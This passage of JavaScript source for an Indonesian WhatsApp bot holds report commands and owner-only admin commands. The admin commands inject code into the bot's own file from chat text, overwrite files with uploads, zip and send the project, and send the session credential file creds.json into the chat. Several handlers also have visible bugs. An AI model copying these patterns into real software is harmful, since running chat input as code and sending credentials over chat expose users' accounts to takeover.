    text: `Balasan dari pemilik bot:\n${replyText}`
  }, {
    quoted: fkontak
  })
  await m.reply('Balasan terkirim!')
  delete laporan[reportId]
  Line.sendMessage(owner + "@s.whatsapp.net", {
    text: `Balasan terkirim ke user dengan ID laporan: ${reportId} dan laporan telah dihapus dari database.`
  }, {
    quoted: fkontak
  })
}
break

case 'laporan':
case 'reports': {
  let laporanText = 'Laporan yang belum dibalas:\n\n'
  for (let id in laporan) {
    if (laporan[id].status === 'Dibuat') {
      laporanText += `ID: ${id}\nNomor: ${laporan[id].sender}\nTeks: ${laporan[id].text}\nWaktu: ${laporan[id].timestamp}\n\n`
    }
  }
  m.reply(laporanText)
}
break

case 'hapuslaporan':
case 'delreports': {
  let reportId = text.trim();
  if (!laporan[reportId]) return m.reply('ID laporan tidak ditemukan atau laporan sudah tidak valid.')
  delete laporan[reportId]
  m.reply('Laporan berhasil dihapus!')
}
break

case 'ceklaporan':
case 'cekreports': {
  let reportId = text.trim();
  if (!laporan[reportId]) return m.reply('ID laporan tidak ditemukan atau laporan sudah tidak valid.')
  let report = laporan[reportId]
  let laporanText = `Detail Laporan:\n\nID: ${reportId}\nNomor: ${report.sender}\nTeks: ${report.text}\nWaktu: ${report.timestamp}\nStatus: ${report.status}`
  m.reply(laporanText)
}
break

case 'delete':
case 'del': {
  if (!froms == botNumber) return m.reply('Kutip pesan bot yang ingin dihapus!')
  Line.sendMessage(m.chat, {
    delete: {
      remoteJid: m.chat,
      fromMe: true,
      id: m.quoted.id,
      participant: m.quoted.sender
    }
  })
}
break

// === Owner Menu
case 'addcase': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} case nya`);
const namaFile = path.join(__dirname, 'Line.js');
const caseBaru = `${text}\n\n`;
const tambahCase = (data, caseBaru) => {
const posisiDefault = data.lastIndexOf("default:");
if (posisiDefault !== -1) {
const kodeBaruLengkap = data.slice(0, posisiDefault) + caseBaru + data.slice(posisiDefault);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Tidak dapat menemukan case default di dalam file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
}
const result = tambahCase(data, caseBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('Terjadi kesalahan saat menulis file:', err);
return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
} else {
console.log('Sukses menambahkan case baru:');
console.log(caseBaru);
return m.reply('Sukses menambahkan case!');
}});
} else {
console.error(result.message);
return m.reply(result.message);
}});
}
break

case 'delcase': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} nama case`);
const fs = require('fs').promises;
async function dellCase(filePath, caseNameToRemove) {
try {
let data = await fs.readFile(filePath, 'utf8');
const regex = new RegExp(`case\\s+'${caseNameToRemove}':[\\s\\S]*?break`, 'g');
const modifiedData = data.replace(regex, '');
if (data === modifiedData) {
m.reply('Case tidak ditemukan atau sudah dihapus.');
return;
}
await fs.writeFile(filePath, modifiedData, 'utf8');
m.reply('Sukses menghapus case!');
} catch (err) {
m.reply(`Terjadi kesalahan: ${err.message}`);
}}
dellCase('./Line.js', q);
}
break

case 'getcase': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} 1 caseName atau ${prefix+command} 2 caseName1 caseName2`);
const modeRegex = /^([12])\s+(.+)$/;
const match = text.match(modeRegex);
if (!match) return m.reply(`Format tidak valid. Contoh: ${prefix+command} 1 caseName atau ${prefix+command} 2 caseName1 caseName2`);
const mode = parseInt(match[1], 10);
const caseNames = match[2].split(' ').map(name => name.trim()).filter(name => name);
if (mode === 1 && caseNames.length !== 1) {
return m.reply(`Untuk mode '1', masukkan satu case name. Contoh: ${prefix+command} 1 caseName`);
}
if (mode === 2 && (caseNames.length < 1 || caseNames.length > 2)) {
return m.reply(`Untuk mode '2', masukkan satu atau dua case names. Contoh: ${prefix+command} 2 caseName1 caseName2`);
}
const getCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile('./Line.js', "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return m.reply(`Case '${caseName}' tidak ditemukan.`);
}
return match[0];
} catch (error) {
return m.reply(`Terjadi kesalahan saat membaca file: ${error.message}`);
}};
const getCases = async (caseNames) => {
try {
const casePromises = caseNames.map(caseName => getCase(caseName));
const cases = await Promise.all(casePromises);
return cases.join('\n\n');
} catch (error) {
return m.reply(`Terjadi kesalahan: ${error.message}`);
}};

getCases(caseNames)
.then(caseCode => m.reply(caseCode))
.catch(error => m.reply(`Terjadi kesalahan: ${error.message}`));
}
break

case 'cekcase': {
  if (!isOwner) return onlyOwn();
  if (!text) return m.reply(`Contoh: ${p_c} caseName`);
  const caseName = text.trim();
  if (!caseName) return m.reply(`Masukkan nama case yang ingin dicek. Contoh: ${p_c} caseName`);
  const cekCase = async (caseName) => {
    try {
      const fileContent = await fs.promises.readFile('./Line.js', "utf-8");
      const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
      const match = fileContent.match(caseRegex);
      if (!match) {
        return {
          found: false
        };
      }
      const lines = fileContent.split('\n');
      const caseLines = match[0].split('\n');
      const startLine = lines.indexOf(caseLines[0]) + 1;
      const endLine = startLine + caseLines.length - 1;
      return {
        found: true,
        startLine,
        endLine,
        content: match[0]
      };
    } catch (error) {
      return {
        error: `Terjadi kesalahan saat membaca file: ${error.message}`
      };
    }
  };
  const result = await cekCase(caseName);
  if (result.error) {
    m.reply(result.error);
  } else if (result.found) {
    const message = `
*CASE DITEMUKAN!*
• Nama Case: ${caseName}
• Baris Awal: ${result.startLine}
• Baris Akhir: ${result.endLine}

Mau sekalian di ambil?
Ketik .getcase 1 ${caseName}`
    let kon = `{\"display_text\":\"YA\",\"id\":\"${p_c}getcase 1 ${text}\"}`
    quickreply1(m.chat, message, kon, m)
    userSessions[m.sender] = {
      caseToRetrieve: result,
      caseName
    };
  } else {
    m.reply(`Case '${caseName}' tidak ditemukan.`);
  }
}
break

case 'listcase': {
if (!isOwner) return onlyOwn()
let { listCase } = require('./lib/general/scrape')
m.reply(listCase())
}
break

case 'addfunc':
case 'addfunction': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} function barunya`);
const namaFile = path.join(__dirname, 'Line.js');
const functionBaru = `${text}\n\n`;
const tambahFunction = (data, functionBaru) => {
const posisiButtonUrl = data.indexOf("function buttonurl");
if (posisiButtonUrl !== -1) {
const kodeBaruLengkap = data.slice(0, posisiButtonUrl) + functionBaru + data.slice(posisiButtonUrl);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Tidak dapat menemukan function buttonurl di dalam file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
}
const result = tambahFunction(data, functionBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('Terjadi kesalahan saat menulis file:', err);
return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
} else {
console.log('Sukses menambahkan function baru:');
console.log(functionBaru);
return m.reply('Sukses menambahkan function!');
}});
} else {
console.error(result.message);
return m.reply(result.message);
}});
}
break

case 'delfunc':
case 'delfunction': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} functionName`);
const isValidFunctionName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const deleteFunction = (functionName) => {
if (!isValidFunctionName(functionName)) return m.reply(`Nama fungsi tidak valid: ${functionName}`);
try {
const fileContent = fs.readFileSync('./Line.js', "utf8");
const functionRegex = new RegExp(`function\\s+${functionName}\\s*\\([^)]*\\)\\s*{`, "g");
const match = functionRegex.exec(fileContent);
if (!match) return m.reply(`Fungsi ${functionName} tidak ditemukan`);
const functionStart = match.index;
let braceCount = 0;
let inString = false;
let inComment = false;
let currentChar, prevChar;
let functionEnd;

for (let i = functionStart; i < fileContent.length; i++) {
currentChar = fileContent[i];
if (prevChar === '/' && currentChar === '*') inComment = true;
if (prevChar === '*' && currentChar === '/') inComment = false;
if (!inComment) {
if (currentChar === '"' || currentChar === "'" || currentChar === '`') inString = !inString;
if (!inString) {
if (currentChar === '{') braceCount++;
if (currentChar === '}') braceCount--;
}}
if (braceCount === 0 && currentChar === '}') {
functionEnd = i + 1;
break
}
prevChar = currentChar;
}
if (functionEnd === undefined) return m.reply(`Fungsi ${functionName} tidak lengkap atau kurung kurawal tidak seimbang`);
const updatedContent = fileContent.slice(0, functionStart) + fileContent.slice(functionEnd);
fs.writeFileSync('./Line.js', updatedContent, "utf8");
return m.reply(`Fungsi ${functionName} telah dihapus`);
} catch (err) {
return m.reply(`Terjadi kesalahan: ${err.message}`);
}};
m.reply(deleteFunction(q));
}
break

case 'getfunc':
case 'getfunction': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} functionName`);
const isValidFunctionName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const getFunction = (functionName) => {
if (!isValidFunctionName(functionName)) return m.reply(`Nama fungsi tidak valid: ${functionName}`);
try {
const fileContent = fs.readFileSync('./Line.js', "utf8");

const functionRegex = new RegExp(`function\\s+${functionName}\\s*\\([^)]*\\)\\s*{`, "g");
const match = functionRegex.exec(fileContent);
if (!match) return m.reply(`Fungsi ${functionName} tidak ditemukan`);

const functionStart = match.index;
let braceCount = 0;
let inString = false;
let inComment = false;
let currentChar, prevChar;
for (let i = functionStart; i < fileContent.length; i++) {
currentChar = fileContent[i];
if (prevChar === '/' && currentChar === '*') inComment = true;
if (prevChar === '*' && currentChar === '/') inComment = false;
if (!inComment) {
if (currentChar === '"' || currentChar === "'" || currentChar === '`') inString = !inString;
if (!inString) {
if (currentChar === '{') braceCount++;
if (currentChar === '}') braceCount--;
}}
if (braceCount === 0 && currentChar === '}') {
const functionEnd = i + 1;
const functionContent = fileContent.slice(functionStart, functionEnd);
return functionContent;
}
prevChar = currentChar;
}} catch (err) {
return m.reply(`Terjadi kesalahan: ${err.message}`);
}}  
m.reply(`${getFunction(q)}`);
}
break

case 'cekfunc':
case 'cekfunction': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} functionName`);
const functionName = text.trim();
if (!functionName) return m.reply(`Masukkan nama function yang ingin dicek. Contoh: ${prefix+command} functionName`);
const cekFunction = async (functionName) => {
try {
const fileContent = await fs.promises.readFile('./Line.js', "utf-8");
const functionRegex = new RegExp(`function ${functionName}\\s*\\([\\s\\S]*?\\)\\s*\\{[\\s\\S]*?\\}`, 'g');
const match = fileContent.match(functionRegex);
if (!match) {
return { found: false };
}
const lines = fileContent.split('\n');
const functionLines = match[0].split('\n');
const startLine = lines.indexOf(functionLines[0]) + 1;
const endLine = startLine + functionLines.length - 1;
return {
found: true,
startLine,
endLine,
content: match[0]
};
} catch (error) {
return { error: `Terjadi kesalahan saat membaca file: ${error.message}` };
}};
const result = await cekFunction(functionName);
if (result.error) {
m.reply(result.error);
} else if (result.found) {
const message = `
*FUNCTION DITEMUKAN!*
• Nama funct: ${functionName}
• Baris awal: ${result.startLine}
• Baris akhir: ${result.endLine}

Mau sekalian di ambil?`;
let kun = `{\"display_text\":\"YA\",\"id\":\"${prefix}getfunc ${text}\"}`
quickreply1(m.chat, message, kun, m)
userSessions[m.sender] = { functionToRetrieve: result, functionName };
} else {
m.reply(`Function '${functionName}' tidak ditemukan.`);
}
}
break

case 'addlet': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} let barunya`);
const namaFile = path.join(__dirname, 'Line.js');
const letBaru = `${text}\n\n`;
const tambahLet = (data, letBaru) => {
const posisiContacts = data.indexOf("const contacts");
if (posisiContacts !== -1) {
const kodeBaruLengkap = data.slice(0, posisiContacts) + letBaru + data.slice(posisiContacts);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Tidak dapat menemukan const contacts di dalam file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
}
const result = tambahLet(data, letBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('Terjadi kesalahan saat menulis file:', err);
return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
} else {
console.log('Sukses menambahkan let baru:');
console.log(letBaru);
return m.reply('Sukses menambahkan let!');
}});
} else {
console.error(result.message);
return m.reply(result.message);
}});
}
break

case 'dellet': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} letVariableName`);
const isValidVariableName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const deleteLet = (variableName) => {
if (!isValidVariableName(variableName)) return m.reply(`Nama variabel tidak valid: ${variableName}`);
try {
const fileContent = fs.readFileSync('./Line.js', "utf8");
const letRegex = new RegExp(`\\blet\\s+${variableName}\\s*=\\s*([^;]+);`, "g");
const match = letRegex.exec(fileContent);
if (!match) return m.reply(`Variabel ${variableName} tidak ditemukan`);

const variableStart = match.index;
const variableEnd = variableStart + match[0].length;
const updatedContent = fileContent.slice(0, variableStart) + fileContent.slice(variableEnd);
fs.writeFileSync('./Line.js', updatedContent, "utf8");
return m.reply(`Variabel ${variableName} telah dihapus`);
} catch (err) {
return m.reply(`Terjadi kesalahan: ${err.message}`);
}};
m.reply(deleteLet(q));
}
break

case 'getlet': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} letName`);
const isValidVariableName = (name) => /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(name);
const getLet = (letName) => {
if (!isValidVariableName(letName)) return m.reply(`Nama variabel tidak valid: ${letName}`);
try {
const fileContent = fs.readFileSync('./Line.js', "utf8");
const letRegex = new RegExp(`let\\s+${letName}\\s*=`, "g");
const match = letRegex.exec(fileContent);

if (!match) return m.reply(`Variabel ${letName} tidak ditemukan`);
const letStart = match.index;
let braceCount = 0;
let inString = false;
let inComment = false;
let currentChar, prevChar;

for (let i = letStart; i < fileContent.length; i++) {
currentChar = fileContent[i];
if (prevChar === '/' && currentChar === '*') inComment = true;
if (prevChar === '*' && currentChar === '/') inComment = false;
if (!inComment) {
if (currentChar === '"' || currentChar === "'" || currentChar === '`') {
if (inString && currentChar === inString) {
inString = false;
} else if (!inString) {
inString = currentChar;
}}
if (!inString && !inComment) {
if (currentChar === '{') braceCount++;
if (currentChar === '}') braceCount--;
if (currentChar === ';' && braceCount === 0) {
const letEnd = i + 1;
const letContent = fileContent.slice(letStart, letEnd);
return letContent;
}}}
prevChar = currentChar;
}} catch (err) {
return m.reply(`Terjadi kesalahan: ${err.message}`);
}}
m.reply(`${getLet(q)}`);
}
break

case 'addconst': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} const barunya`);
const namaFile = path.join(__dirname, 'Line.js');
const constBaru = `${text}\n\n`;
const tambahConst = (data, constBaru) => {
const posisiIsAntiLink = data.indexOf("const contacts");
if (posisiIsAntiLink !== -1) {
const kodeBaruLengkap = data.slice(0, posisiIsAntiLink) + constBaru + data.slice(posisiIsAntiLink);
return { success: true, kodeBaruLengkap };
} else {
return { success: false, message: "Tidak dapat menemukan const contacts di dalam file!" };
}};
fs.readFile(namaFile, 'utf8', (err, data) => {
if (err) {
console.error('Terjadi kesalahan saat membaca file:', err);
return m.reply(`Terjadi kesalahan saat membaca file: ${err.message}`);
}
const result = tambahConst(data, constBaru);
if (result.success) {
fs.writeFile(namaFile, result.kodeBaruLengkap, 'utf8', (err) => {
if (err) {
console.error('Terjadi kesalahan saat menulis file:', err);
return m.reply(`Terjadi kesalahan saat menulis file: ${err.message}`);
} else {
console.log('Sukses menambahkan const baru:');
console.log(constBaru);
return m.reply('Sukses menambahkan const!');
}});
} else {
console.error(result.message);
return m.reply(result.message);
}});
}
break

case 'getdep':
case 'getdepencendies': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} 1 depName atau ${prefix+command} 2 depName1 depName2`);
const modeRegex = /^([12])\s+(.+)$/;
const match = text.match(modeRegex);
if (!match) return m.reply(`Format tidak valid. Contoh: ${prefix+command} 1 depName atau ${prefix+command} 2 depName1 depName2`);
const mode = parseInt(match[1], 10);
const depNames = match[2].split(' ').map(name => name.trim()).filter(name => name);
if (mode === 1 && depNames.length !== 1) {
return m.reply(`Untuk mode '1', masukkan satu dep name. Contoh: ${prefix+command} 1 depName`);
}
if (mode === 2 && (depNames.length < 1 || depNames.length > 2)) {
return m.reply(`Untuk mode '2', masukkan satu atau dua dep names. Contoh: ${prefix+command} 2 depName1 depName2`);
}
const getDependency = async (depName) => {
try {
const packageContent = await fs.promises.readFile('./package.json', "utf-8");
const packageJson = JSON.parse(packageContent);
const dependencyVersion = packageJson.dependencies[depName] || packageJson.devDependencies[depName];
if (!dependencyVersion) {
return m.reply(`Dependency '${depName}' tidak ditemukan.`);
}
return `"${depName}": "${dependencyVersion}"`;
} catch (error) {
return m.reply(`Terjadi kesalahan saat membaca file: ${error.message}`);
}};
const getDependencies = async (depNames) => {
try {
const depPromises = depNames.map(depName => getDependency(depName));
const dependencies = await Promise.all(depPromises);
return dependencies.join('\n\n');
} catch (error) {
return m.reply(`Terjadi kesalahan: ${error.message}`);
}};
getDependencies(depNames)
.then(dependencyCode => m.reply(dependencyCode))
.catch(error => m.reply(`Terjadi kesalahan: ${error.message}`));
}
break

case 'gf':
case 'gfl':
case 'gantifile': {
if (!isOwner) return onlyOwn();
if (!text.includes('./')) return m.reply(`Contoh: ${prefix+command} ./package.json`); 
let dir = path.dirname(text);
let fileName = path.basename(text);
if (!fs.existsSync(dir)) {
return m.reply('Direktori tidak ditemukan!');
}

let files = fs.readdirSync(dir);
if (!files.includes(fileName)) {
return m.reply('Tidak dapat menemukan file!');
}
let media = await downloadContentFromMessage(m.quoted, "document");
let buffer = Buffer.from([]);
for await (const chunk of media) {
buffer = Buffer.concat([buffer, chunk]);
}

fs.writeFileSync(text, buffer);
edit2(`Mengupload file...`, `Sukses mengupload ${fileName}`);
}
break

case 'sendcase':
case 'sendfitur': {
if (!isOwner) return onlyOwn();
if (!m.quoted) return m.reply('Kutip pesan seseorang!');
if (!text) return m.reply(`Contoh: ${prefix+command} menu`);
const getCase = async (caseName) => {
try {
const fileContent = await fs.promises.readFile('./Line.js', "utf-8");
const caseRegex = new RegExp(`case '${caseName}'[\\s\\S]*?break`, 'g');
const match = fileContent.match(caseRegex);
if (!match) {
return m.reply(`Case '${caseName}' tidak ditemukan.`);
}
return match[0];
} catch (error) {
return m.reply(`Terjadi kesalahan saat membaca file: ${error.message}`);
}};
const caseName = text.trim();
getCase(caseName)
.then(caseCode => {
const recipient = m.quoted ? m.quoted.sender : m.mentionedJid[0];
if (!recipient || !recipient.includes('@s.whatsapp.net')) {
return m.reply('Format ID WhatsApp tidak valid!');
}
const sendFeature = async (recipient, caseCode) => {
try {
const contact = (await Line.onWhatsApp(recipient.split('@')[0]))[0] || {};
if (!contact) return m.reply('Kontak tidak ditemukan di WhatsApp.');
const message = `Hi, kamu dapet kiriman fitur nih!\n\n${caseCode}`;
await Line.sendMessage(recipient, { text: message }, { quoted: m });
m.reply('Fitur berhasil terkirim!');
} catch (error) {
console.error('Terjadi kesalahan:', error.message);
m.reply('Terjadi kesalahan saat mengirim fitur: ' + error.message);
}};
sendFeature(recipient, caseCode);
})
.catch(error => m.reply(`Terjadi kesalahan: ${error.message}`));
}
break

case 'backup': {
if (!isOwner) return onlyOwn()
try {
edit2('Mengumpulkan semua file ke folder...', 'Sukses backup script.');
const { execSync } = require("child_process");
 const ls = (await execSync("ls")).toString().split("\n").filter( (pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != "" );
const exec = await execSync(`zip -r Backup.zip ${ls.join(" ")}`);
await Line.sendMessage(m.isGroup ? owner+'@s.whatsapp.net' : from, {
document: await fs.readFileSync('./Backup.zip'),
mimetype: "application/zip",
fileName: "Backup.zip",
},
{quoted: m });
await execSync("rm -rf Backup.zip");
} catch(err) {
m.reply('Terjadi kesalahan')
}}
break

case 'getsesi':
case 'getsession': {
if (!isOwner) return onlyOwn()
vreact()
let sesi = await fs.readFileSync(`./${sessionName}/creds.json`)
await Line.sendMessage(m.chat, {
document: sesi,
mimetype: 'application/json',
fileName: 'creds.json'
}, {quoted: m})
}
break

case 'delsesi':
case 'delsession': {
if (!isOwner) return onlyOwn()
fs.readdir(`./${sessionName}`, async function(err, files) {
if (err) {
console.log('Unable to scan directory: ' + err);
return m.reply('Unable to scan directory: ' + err);}
let filteredArray = await files.filter(item => item.startsWith("pre-key") ||
item.startsWith("sender-key") || item.startsWith("session-") || item.startsWith("app-state"))
console.log(filteredArray.length);
let teks = `Detected ${filteredArray.length} junk files\n\n`
if (filteredArray.length == 0) return m.reply(teks)
filteredArray.map(function(err, i) {
teks += (i + 1) + `. ${e}\n` })
m.reply(teks)
await sleep(2000)
m.reply("Menghapus session...")
await filteredArray.forEach(function(file) {
fs.unlinkSync(`./${sessionName}/${file}`)
});
await sleep(2000)
m.reply('Sukses menghapus session!')
});
}
break

case 'ambilsc': {
if (!isOwner) return onlyOwn()
if (!isPc) return onlyPrivat()
vreact()
let a = getTime().split("T")[1].split("+")[0]
var name = `Line-Beta` // Gak bisa pake spasi !
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await Line.sendMessage(owner+'@s.whatsapp.net', {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, 
mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
}
break

case 'sendsc': {
if (!isOwner) return onlyOwn()
if (!m.quoted) return m.reply('Kutip pesan seseorang!')
edit2("Memproses pengiriman...", "Script berhasil terkirim!")
let a = getTime().split("T")[1].split("+")[0]
let t = q.split(' ');
let u = m.quoted ? m.quoted.sender : t[3] ? t[3].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let d = (await Line.onWhatsApp(u.split`@`[0]))[0] || {}
var name = `Line-Beta` // Gak bisa pakai spasi !
const ls = (await execSync("ls"))
.toString()
.split("\n")
.filter(
(pe) =>
pe != "node_modules" &&
pe != "session" &&
pe != "package-lock.json" &&
pe != "yarn.lock" &&
pe != ""
)
const anu = await execSync(`zip -r ${name}.zip ${ls.join(" ")}`)
await Line.sendMessage(u, {document: await fs.readFileSync(`./${name}.zip`), fileName: `${name}.zip`, 
mimetype: "application/zip"}, {quoted: m})
await execSync(`rm -rf ${name}.zip`)
}
break

case 'addreseller':
case 'addres': {
if (!isOwner) return onlyOwn()
if (!args[0]) return m.reply(`Contoh: ${prefix+command} nomor`)
bnnd = text.split("|")[0].replace(/[^0-9]/g, '')
let cekseler = await Line.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (cekseler.length == 0) return m.reply(`Masukkan nomor yang aktif!`)
res.push(bnnd)
fs.writeFileSync('./data/reseller.json', JSON.stringify(res))
m.reply(`Berhasil addreseller`)
}
break

case 'delreseller':
case 'delres': {
if (!isOwner) return onlyOwn()
if (!args[0]) return reply(`Contoh: ${prefix+command} nomor`)
yaki = text.split("|")[0].replace(/[^0-9]/g, '')
unp = res.indexOf(yaki)
res.splice(unp, 1)
fs.writeFileSync('./data/reseller.json', JSON.stringify(res))
reply(`Berhasil delreseller
👤 *User*: ${yaki}
📆 *Tanggal*: ${penghitung}
`)
}
break

case 'listreseller':
case 'listres': {
if (!isOwner) return onlyOwn()
tekso = `List reseller\nTotal: ${res.length}\n\n`
for (let i of res) {
tekso += `• ${i}\n`
}
reply(tekso.trim())
}
break

case 'addprem': { 
if (!isOwner) return onlyOwn()
const swn = args.join(" ")
const pcknm = swn.split("|")[0];
const atnm = swn.split("|")[1];
if (!pcknm) return reply(`Contoh: ${prefix+command} @tag|30d`)
if (!atnm) return reply(`Mau berapa hari?`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply(`Berhasil addprem
👤 *User*: ${users}
📆 *Tanggal*: ${penghitung}
`)
} else {
var cekap = await Line.onWhatsApp(pcknm+"@s.whatsapp.net")
if (cekap.length == 0) return reply(`Masukkan nomor yang aktif!`)
prem.addPremiumUser((pcknm.replace('@','')+'@s.whatsapp.net').replace(' @','@'), atnm, premium)
reply(`Berhasil addprem
👤 *User*: ${users}
📆 *Tanggal*: ${penghitung}
`)
}}
break

case 'delprem':
if (!isOwner) return onlyOwn()
if (!args[0]) return reply(`Contoh: ${prefix+command} 628xx`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
if (users) {
premium.splice(prem.getPremiumPosition(users, premium), 1)
fs.writeFileSync('./data/premium.json', JSON.stringify(premium))
reply('Berhasil delprem')
} else {
var cekpr = await Line.onWhatsApp(args[0]+"@s.whatsapp.net")
if (cekpr.length == 0) return reply(`Masukkan nomor yang aktif!`)
premium.splice(prem.getPremiumPosition(args[0] + '@s.whatsapp.net', premium), 1)
fs.writeFileSync('./data/premium.json', JSON.stringify(premium))
reply(`Berhasil delprem
👤 *User*: ${users}
📆 *Tanggal*: ${penghitung}
`)
}
break

case 'listpremium': 
case 'listprem': {
if (!isOwner) return onlyOwn()
let txt = `List premium\nTotal: ${premium.length}\n\n`;
let men = [];
for (let i of premium) {
men.push(i.id);
let idPart = i.id?.split("@")[0] ?? 'Undefined';
txt += `ID: @${idPart}\n`;
if (i.expired === 'Permanen') {
let cekvip = 'Permanen';
txt += `Expired: Permanen\n\n`;
} else {
let cekvip = ms(i.expired - Date.now());
txt += `Expired: ${cekvip.days} hari, ${cekvip.hours} jam, ${cekvip.minutes} menit, ${cekvip.seconds} detik\n\n`;
}
}
Line.sendTeks(m.chat, txt, m);
}
break

case 'addowner': {
if (!isOwner) return onlyOwn()
if (!args[0]) return reply(`Contoh: ${prefix+command} tag/reply`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')
let ceknye = await Line.onWhatsApp(users)
if (ceknye.length == 0) return reply(`Nomor tersebut tidak valid!`)
own.push(users)
fs.writeFileSync('./data/owner.json', JSON.stringify(own))
reply(`Berhasil addowner
👤 *User*: ${users}
📆 *Tanggal*: ${penghitung}
`)
}
break

case 'delowner': {
if (!isOwner) return onlyOwn()
if (!args[0]) return reply(`Contoh: ${prefix+command} tag/reply`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await Line.onWhatsApp(users)
if (ceknye.length == 0) return reply(`Nomor tersebut tidak valid!`)
own.splice(users, 1)
fs.writeFileSync('./data/owner.json', JSON.stringify(own))
reply(`Berhasil delowner
👤 *User*: ${users}
📆 *Tanggal*: ${penghitung}
`)
}
break

case 'listown':
case 'listowner': 
case 'listcreator': {
if (!isOwner) return onlyOwn()
pio = `List owner\nTotal: ${own.length}\n\n`
for (let kon of own) {
pio += `• ${kon}\n`
}
m.reply(pio)
}
break

case 'addgold': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} 62xx 1000`);
let trgt = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net';
addGold(trgt, parseInt(args[1]));
m.reply(`*SUKSES ADD GOLD*\nNomor: ${args[0]}\nGold: Rp. ${toRupiah(args[1])}`);
}
break

case 'mingold': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} 628xx 1000`);
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net';
if (cekGold(target) < parseInt(args[1]) && cekGold(target) !== 0) {
return m.reply(`Pengurangan sangat berlebihan!`);
}
minGold(target, parseInt(args[1]));
m.reply(`*SUKSES MIN GOLD*\nNomor: ${args[0]}\nGold: Rp. ${toRupiah(parseInt(args[1]))}`);
}
break

case 'addsaldo': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} 62xx 1000`);
let trgt = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net';
addSaldo(trgt, parseInt(args[1]));
m.reply(`*SUKSES ADD SALDO*\nNomor: ${args[0]}\nSaldo: Rp. ${toRupiah(args[1])}`);
}
break

case 'minsaldo': {
if (!isOwner) return onlyOwn();
if (!text) return m.reply(`Contoh: ${prefix+command} 628xx 1000`);
let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : args[0].replace(/[^0-9]/g, '')+'@s.whatsapp.net';
if (cekSaldo(target) < parseInt(args[1]) && cekSaldo(target) !== 0) {
